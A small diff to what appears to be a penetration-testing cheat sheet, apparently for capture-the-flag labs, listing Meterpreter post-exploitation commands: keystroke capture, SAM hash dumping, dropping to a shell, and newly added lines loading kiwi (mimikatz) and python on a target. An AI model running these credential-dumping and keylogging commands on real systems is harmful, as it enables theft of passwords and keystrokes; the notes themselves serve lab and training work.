@@ -174,7 +174,9 @@ meterpreter>    "keyscan_start |  keyscan_stop, | keyscan_dump"     <-- make Met
 meterpreter>    hashdump                                            <-- dump SAM database
 meterpreter>    search -f flag2.txt                                 <-- search is avail. in meterpreter sessions
 meterpreter>    shell                                               <-- launch a regr cmd-line shell on the target. CTRL+Z will go back to the Meterpreter shell
-
+meterpreter>    load help                                           <-- shows all modules you can load on target
+meterpreter>    load kiwi                                           <-- load kiwi "mimikatz" on target
+meterpreter>    load python                                         <-- load python on target
 
 
 
